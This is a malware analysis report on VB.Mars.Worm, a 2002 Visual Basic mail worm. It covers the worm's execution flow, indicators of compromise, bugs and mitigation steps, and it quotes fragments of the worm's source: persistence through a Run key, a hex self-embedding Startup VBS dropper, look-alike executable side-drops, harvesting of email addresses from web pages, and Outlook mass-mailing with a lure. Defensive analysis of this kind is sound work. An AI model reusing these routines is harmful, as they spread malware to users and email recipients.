# 🛡️ Malware Analysis Report: VB.Mars.Worm (I-Worm.Mars)

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-Win32%20Email/Web%20Worm%20(VB6+VBS)-red)
![Creation Date](https://img.shields.io/badge/created-2002--06--20-orange)

## Overview

VB.Mars.Worm (I-Worm.Mars) is a multi-vector Visual Basic 6 worm that combines binary infection of executables, web content scraping for email harvesting, Outlook mass mailing, and VBS dropper generation for persistence and secondary spread. Authored by PetiK and dated June 20, 2002, the project includes VB6 source (`modmars.bas`), a hidden form (`FrmMars.frm`), an icon, and a generated VBS script written into the user's Startup folder. A reference PDF ("Symantec Security Response - W32.Gubed@mm.pdf") in the directory suggests similarity or comparative study with another mailer worm.

Artifacts:
- `modmars.bas` – core worm logic
- `FrmMars.frm` / `FrmMars.frx` – invisible form (no UI payload)
- `WormMars.vbp` / `WormMars.vbw` – VB6 project files
- `WormMars.ex_` – packed sample
- `screenhot.png` – screenshot artifact (typo in name)
- `decrypt.txt` – contains identifier `I-Worm.Mars`
- `icon.ico` – executable icon resource

> Disclaimer: Historical malware analysis for research/education. Do not execute outside a controlled lab environment.

## Execution Flow (Sub Main)

Key stages inside `Sub Main()`:

```vb
Sub Main()
On Error Resume Next
' Build list of default/home page candidate filenames
ext(1) = "index.htm": ext(2) = "index.html": ext(3) = "index.asp"
ext(4) = "default.htm": ext(5) = "default.html": ext(6) = "default.asp"
ext(7) = "main.htm": ext(8) = "main.html": ext(9) = "main.asp"

sysDir = Space(500)
sysDir = Left(sysDir, GetSystemDirectory(sysDir, Len(sysDir)))
winDir = Space(500)
winDir = Left(sysDir, GetWindowsDirectory(winDir, Len(winDir)))
orig = App.Path & "\" & App.EXEName & ".exe"

Call Install           ' persistence
Call VbsDrop           ' hex-encodes itself into Startup VBS
Call InfectExe(sysDir) ' drop copies alongside EXEs
Call InfectExe(winDir)

checkconnect:
If InternetGetConnectedState(0&, 0&) = 0 Then GoTo checkconnect

sp = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
If Len(sp) <> 0 Then
  If Right(sp, 1) = "/" Then
     For i = 1 To 9: srchmail sp & ext(i): Next
  ElseIf Right(sp, 4) <> ".htm" And Right(sp, 5) <> ".html" Then
     For i = 1 To 9: srchmail sp & "/" & ext(i): Next
  End If
End If
End Sub
```

Highlights:
- Resolves System and Windows directories.
- Ensures network connectivity before web harvesting.
- Attempts to build candidate URLs based on the browser's Start Page for email scraping.

## Persistence (Install)

Copies itself and sets a Run key:

```vb
Sub Install()
FileCopy orig, sysDir & "\DebugW32.exe"
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Debug", sysDir & "\DebugW32.exe"
End Sub
```

Creates `DebugW32.exe` in `%System%` with an autostart value `Debug` under HKLM Run.

## VBS Dropper (Startup Folder) – Hex Self-Embedding

`VbsDrop` reads its own binary and converts bytes to hex, constructing a VBS file (`start.vbs`) in the Startup folder. That script reconstructs and writes `DebugW32.exe` then re-establishes the Run key.

```vb
Open orig For Binary As #1
Do While Not EOF(1)
  Get #1, , bbyte
  e = Hex(bbyte)
  If Len(e) = 1 Then e = "0" & Hex(bbyte)
  pefile = pefile & e
Loop
Close #1

vbsf = "'Mars" & vbCrLf & _
       "pevb=""" & pefile & """" & vbCrLf & _
       "read = dec(pevb)" & vbCrLf & _
       "Set r = fso.CreateTextFile(fso.GetSpecialFolder(1) & ""\DebugW32.exe"", 2)" & vbCrLf & _
       "r.Write read" & vbCrLf & _
       "ws.RegWrite \"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Debug\", fso.GetSpecialFolder(1) & \"\DebugW32.exe\""
```

Additional appended blocks:
- Recursively copy VBS beside non-VBS files in `MyDocuments` and subfolders.
- Outlook mass-mail (`SprdOut`) with subject "Important EMail" and self-attachment.
- Hex decoder function `dec()` uses `Chr("&h" & Mid(...))` pattern.

## Executable Side-Drops (InfectExe)

Places copies of itself next to up to 5 existing `.exe` files in target directories, appending `_vbpe.exe` suffix to the original name.

```vb
If ext = "exe" Then
  If nam <> "debugw32.exe" And Right(nam, 9) <> "_vbpe.exe" Then
    If Not fso.FileExists(P.Name & "_vbpe.exe") Then
       FileCopy orig, dir & "\" & P.Name & "_vbpe.exe"
       x = x + 1
    End If
  End If
End If
If x = 5 Then Exit For
```

This creates look-alike executables, relying on user confusion (double-click) for execution.

## Web Harvesting and Email Extraction (srchmail)

Fetches candidate pages built from the Start Page and scans for `mailto:` patterns.

```vb
InternetReadFile hFile, sBuffer, 25000, Ret
For j = 1 To Len(sbufr)  ' (BUG: variable should be sBuffer)
  If Mid(sBuffer, j, 7) = "mailto:" Then
     mlto = ""
     Do While Mid(sBuffer, j + 7 + cnt, 1) <> """"
        mlto = mlto & Mid(sBuffer, j + 7 + cnt, 1)
        cnt = cnt + 1
     Loop
     SendMail mlto
  End If
Next
```

Bug notes:
- Uses `sbufr` instead of `sBuffer` in loop condition — harvest loop may not iterate (typo).
- Lacks boundary checks; risk of runtime errors if malformed HTML.

## Direct Mail Sender (SendMail)

Sends congratulatory message with attached binary:

```vb
mel.Subject = "Congratulations for your site"
mel.Body = "Congratulations for your site" & vbCrLf & _
           "This is a good tool to improve it." & vbCrLf & vbCrLf & _
           "Best Regards."
mel.Attachments.Add orig, 1, 1, "WebMakeFullInstall.exe"
```

Social engineering: Presents itself as a site improvement tool.

## Hidden Form / GUI

`FrmMars.frm` defines `Form1` which is invisible (`Visible = 0`). No UI-driven payload; used only because VB6 project requires a startup form or stub. Icon resource is embedded (`icon.ico`).

## Indicators of Compromise (IoCs)

- Files:
  - `%System%\DebugW32.exe`
  - Startup folder `start.vbs` embedding hex of the worm
  - Side-dropped executables: `<original>.exe_vbpe.exe` (typo variant) or `<original>_vbpe.exe` in `%System%` / `%WinDir%`
- Registry:
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Debug = %System%\DebugW32.exe`
- Outlook activity:
  - Subjects: "Important EMail for <Name>" (VBS), "Congratulations for your site" (binary sender)
- Network:
  - HTTP GET requests to derived Start Page paths (`index.*`, `default.*`, `main.*`)

## Notable Bugs / Fragility

- `winDir` assignment mistakenly uses `Left(sysDir, GetWindowsDirectory(...))` reusing buffer logic; possible truncation or wrong path.
- Email scraping loop references `sbufr` not defined; likely prevents harvesting.
- No graceful fallback if Start Page is non-HTTP or local.
- Lack of error handling for WinINet calls beyond `On Error Resume Next` blanket.

## Mitigation

1. Remove Run key `Debug`; delete `%System%\DebugW32.exe`.
2. Delete malicious `start.vbs` from Startup; inspect for hex-encoded payload lines.
3. Search and remove `_vbpe.exe` appended executables.
4. Monitor Outlook COM automation events; block unsanctioned script initiators.
5. Inspect web proxy logs for suspicious automated requests to Start Page derivatives.
6. Enforce least privilege to prevent writes to system directories and HKLM Run.

## Comparison / Context

The inclusion of the Symantec PDF on W32.Gubed@mm hints Mars may borrow its mail-harvesting and mass-mailing tactics or was studied during development. Mars extends typical mail worm behavior with Start Page scraping and local executable side-drops combined with a hex-loader VBS in Startup.

## Notes

VB.Mars.Worm is a composite experiment mixing binary, VBS, and network layers. While functional in principle, multiple typos reduce effective spread. Its strategy underscores early-2000s reliance on Outlook, loose browser security, and user confusion via near-duplicate executables.

— Analysis based on `modmars.bas`, auxiliary project artifacts, and resource files (June 20, 2002).